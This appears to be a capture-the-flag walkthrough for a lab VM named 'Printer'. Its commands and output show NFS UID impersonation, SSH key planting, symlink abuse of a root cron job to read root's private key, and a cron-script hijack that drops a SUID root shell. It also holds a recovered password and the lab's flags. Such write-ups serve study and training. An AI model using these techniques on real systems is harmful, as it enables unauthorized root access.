# Printer

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.133:22
Open 10.0.2.133:111
Open 10.0.2.133:2049
Open 10.0.2.133:34893
Open 10.0.2.133:41397
Open 10.0.2.133:48189
Open 10.0.2.133:54263
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.133
PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 18:96:ad:89:71:03:7f:6c:8b:a1:d2:83:ca:6f:0e:56 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDxOtRGq8HFdbRgwdwFWGCCwFMDzFIMykJCphIiusDq8BgysAKGnoy06zcgoK9HzymGG2pPbhJQ9qIfohHRKD/YSRCK0v+mxAOaZfTHFEuMw9XYdJla4AOQ1AYdMLI6H7l0lTnQDJFysBAyhLwSgvN1IsrFh6oHpXWWtjh+MB4RZTH1KPL5z34HR6isoY3LZfWuzra1zWOY8TnUNhpSjWH59t32BRWu1AZ185ns1x4ziefx4vY4wVdYZD0xGdF1QzV0N7MvyvDg0dRZEUcmkVCs1FVYqrxj8lI41eDv6mAEAfm3DXpvs6vWoxgKh469CX/F6u9K79XeN8jV8mgMC1o1d9fOmTgTUkxf9M2EBirSJmWf7Gn7mzx06dO9nXElves1JTlFccYqD+V4j6VugT12uKcMEMwT9w3RoL0XDKrNrXmGWH/QtIIfoXbtlN1YEiPWeXlj451exVVNxs6xgrvoeZpvsCRiU3WOFJD827Suktj+C1SDCeJfOAV+KzSJ/a0=
|   256 a4:1f:bf:9b:2d:cc:f6:82:78:1c:72:bc:31:9f:7d:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPszVeIxPHkdM2v2g7iYZ/nczM9nbzHJDnKeo91aXc5axa8eYU6qNdEDphPIR3xRwUBcCVQo4260PLCoKhMe+W0=
|   256 6a:f6:fc:ff:e8:b8:62:57:7c:68:4d:6a:e3:f4:49:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCa/AyvJmC3T7515pPe3L65QNECVJbzjb+KYxW8hdTQ
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39042/udp6  mountd
|   100005  1,2,3      41397/tcp   mountd
|   100005  1,2,3      55369/udp   mountd
|   100005  1,2,3      58727/tcp6  mountd
|   100021  1,3,4      33592/udp   nlockmgr
|   100021  1,3,4      34893/tcp   nlockmgr
|   100021  1,3,4      37201/tcp6  nlockmgr
|   100021  1,3,4      50302/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack 3-4 (RPC #100003)
34893/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
41397/tcp open  mountd   syn-ack 1-3 (RPC #100005)
48189/tcp open  mountd   syn-ack 1-3 (RPC #100005)
54263/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## NFS

Show mounts
```bash
└─$ showmount -e 10.0.2.133
Export list for 10.0.2.133:
/home/lisa *
```

Mount
```bash
└─$ sudo mount 10.0.2.133:/home/lisa /mnt/tmpmount
```

List files
```bash
└─$ find /mnt/tmpmount -ls
  1048578      4 drwxr-xr-x   4 1098     kali         4096 Jan  8  2023 /mnt/tmpmount
  1048584      4 drwxr-xr-x   3 1098     kali         4096 Jan  7  2023 /mnt/tmpmount/.local
  1048585      4 drwx------   3 1098     kali         4096 Jan 25  2023 /mnt/tmpmount/.local/share
find: ‘/mnt/tmpmount/.local/share’: Permission denied
  1048579      4 -rw-r--r--   1 1098     kali          220 Jan  7  2023 /mnt/tmpmount/.bash_logout
  1048582      0 lrwxrwxrwx   1 root      root            9 Jan  7  2023 /mnt/tmpmount/.bash_history -> /dev/null
  1048580      4 -rw-r--r--   1 1098     kali          807 Jan  7  2023 /mnt/tmpmount/.profile
  1048587      4 drwx------   2 1098     kali         4096 Jan  8  2023 /mnt/tmpmount/.ssh
find: ‘/mnt/tmpmount/.ssh’: Permission denied
  1048583      4 -rwx------   1 1098     kali           33 Jan  7  2023 /mnt/tmpmount/user.txt
  1048581      4 -rw-r--r--   1 1098     kali         3555 Jan  7  2023 /mnt/tmpmount/.bashrc
```

We can't write files or read `.ssh`, however on NFS we can impersonate users.
```bash
└─$ sudo useradd -u 1098 -M -s /usr/bin/bash -p "$(openssl passwd -6 x)" lisa
└─$ su - lisa
lisa@kraken:/mnt/tmpmount$ id
uid=1098(lisa) gid=1098(lisa) groups=1098(lisa)
```

### User.txt

```bash
lisa@kraken:/mnt/tmpmount$ cat user.txt
f590b7e83e4c8cd11d06849f9c1a8f6d
```

## SSH

Since we have write permissions now add SSH key
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHjME3kqXV79+ZPDiPTyhBADjpu4uAU5Z6orlmAKPvi/ woyag@kraken' >> ~/.ssh/authorized_keys
```

On remote
```bash
lisa@kraken:/mnt/tmpmount$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKDijRSWeF6URRbZG6jdw248bTXsBh+brSgi5YIPlXfD woyag@kraken' >> .ssh/authorized_keys
```

Hmm... the key is not accepted...
```bash
└─$ ssh -i id_rsa lisa@10.0.2.133
Warning: Permanently added '10.0.2.133' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lisa@10.0.2.133's password:
```

Fix permissions, when SSH files are too public it may fail to authenticate.
```bash
lisa@kraken:/mnt/tmpmount$ ls -l .ssh/authorized_keys
-rw-rw-r-- 1 lisa lisa 94 Dec  9 14:24 .ssh/authorized_keys
lisa@kraken:/mnt/tmpmount$ chmod 600 .ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa lisa@10.0.2.133
Enter passphrase for key 'id_rsa': x
lisa@printer:~$ id
uid=1098(lisa) gid=1000(lisa) groups=1000(lisa),7(lp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(lpadmin)
```

```bash
└─$ sudo umount /mnt/tmpmount
```

::: info Note
Don't forget to **umount**
:::

## Privilege Escalation

### Intended Route

I found this script in `/opt`
```bash
lisa@printer:/opt/logs$ cat nsecure
#! /bin/bash

dst=/opt/logs
journal=$dst/journal
queued=/var/spool/cups
str="*log*"

touch $journal
chmod 700 $journal
find -L /var/log -type f -name "$str" -exec cp {} $dst  \;
find -L /opt -type f -name "$str" -exec cat {} >> $dst/journal \;
rm $dst/$str

if grep -q "fatal error !" $dst/journal ; then
  umask 007 $queued
  lp -d superPrinter $dst/journal
  umask 022
  zip -P $(<~/.lisaPass) -j $journal.zip $queued/d*
  rm -f $queued/{d*,c*}
  >/var/log/syslog
  >/var/log/user.log
  echo "Lisa, URGENT! Come quickly to fix the problem!" |wall
fi

rm $journal
```

If you write a file to `/opt` with `fatal error !` string you can detect that script is used in cronjob.

Some printer files are available
```bash
lisa@printer:/var/spool/cups$ file *
18358014: HP Printer Job Language data
21581476: HP Printer Job Language data
c00061:   regular file, no read permission
tmp:      sticky, directory
```

```bash
└─$ scp -i id_rsa lisa@10.0.2.133:/var/spool/cups/21581476 21581476.pcl
└─$ scp -i id_rsa lisa@10.0.2.133:/var/spool/cups/18358014 18358014.pcl
```

Hardest part was finding right tool lmao...
- [https://www.coolutils.com/online/PCL-to-PDF](https://www.coolutils.com/online/PCL-to-PDF)

```bash
# 21581476.txt
Hi Lisa,

I made a lot of computer changes while you were away.
I have reviewed the way to manage the logs.
And I also changed your password, it's: 1154p455!1
I prefer to print it out for you so that you can destroy the sheet and there will be no trace.

Love
```

The password is successful for zip file
```bash
lisa@printer:/tmp$ unzip journal.zip
Archive:  journal.zip
[journal.zip] d00052-001 password:
  inflating: d00052-001
lisa@printer:/tmp$ file d00052-001
d00052-001: data
```

`-L` option on `find` is actually dangerous, with this we can abuse soft links and get file read as root.
```bash
└─$ man ln
       -L, --logical
              dereference TARGETs that are symbolic links
```

```bash
lisa@printer:/opt$ echo 'fatal error !' > letmein.log
lisa@printer:/opt$ ln -s /root/.ssh/id_rsa hello.log
lisa@printer:/opt$ ls -alh
total 16K
drwxr-xrwx  3 root root 4.0K Dec  9 21:16 .
drwxr-xr-x 18 root root 4.0K Jan  7  2023 ..
lrwxrwxrwx  1 lisa lisa   17 Dec  9 21:16 hello.log -> /root/.ssh/id_rsa
-rw-r--r--  1 lisa lisa   14 Dec  9 21:15 letmein.log
drwxr-xr-x  2 root root 4.0K Dec  9 21:16 logs
```

```bash
lisa@printer:/tmp$ cp /opt/logs/journal.zip .
lisa@printer:/tmp$ unzip journal.zip
Archive:  journal.zip
[journal.zip] d00052-001 password:
  inflating: d00052-001
  inflating: d00053-001
  inflating: d00054-001
  inflating: d00055-001
  inflating: d00056-001
  inflating: d00057-001
  inflating: d00058-001
  inflating: d00059-001
  inflating: d00060-001
  inflating: d00061-001
  inflating: d00062-001
  inflating: d00063-001
  inflating: d00064-001
lisa@printer:/tmp$ grep -ia 'BEGIN OPENSSH PRIVATE KEY-----' d*
d00064-001:cpts/0192.168.0.10{8ipts/210.0.2.15-----BEGIN OPENSSH PRIVATE KEY-----

lisa@printer:/tmp$ grep -ziao 'BEGIN OPENSSH PRIVATE KEY-----.*' d*
d00064-001:BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
913trazGIjB2PILmBi9FBkm4aw8fN142OWqvOcOPoClcK8G2i0WqaumfqT9LoAicWbtmoN
QTVrZgcBNsoB/FAAAADHJvb3RAcHJpbnRlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
fatal error !
```

```bash
└─$ nano id_rsa.root
└─$ chmod 600 id_rsa.root
└─$ ssh -i id_rsa.root root@10.0.2.133
root@printer:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Unintended Route

Since you have write permissions on `/opt`, but not on `/opt/logs` you can actually abuse that.
```bash
lisa@printer:/opt$ mv logs/ logs2
lisa@printer:/opt$ mkdir logs
lisa@printer:/opt$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash\necho "Lisa, URGENT! Come quickly to fix the problem!" | wall' | tee logs/nsecure
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash
echo "Lisa, URGENT! Come quickly to fix the problem!" | wall
lisa@printer:/opt$ chmod +x logs/nsecure
lisa@printer:/opt$ ls -alh
total 16K
drwxr-xrwx  4 root root 4.0K Dec  9 21:22 .
drwxr-xr-x 18 root root 4.0K Jan  7  2023 ..
drwxr-xr-x  2 lisa lisa 4.0K Dec  9 21:22 logs
drwxr-xr-x  2 root root 4.0K Dec  9 21:22 logs2
# Wait for cronjob to trigger
lisa@printer:/opt$ /tmp/rootbash -p
rootbash-5.1# id
uid=1098(lisa) gid=1000(lisa) euid=0(root) groups=1000(lisa),7(lp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(lpadmin)
```

Boom. SUID bash dropped.

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
ba72c777ca3351ac5a837e0cd8efa0ed
```

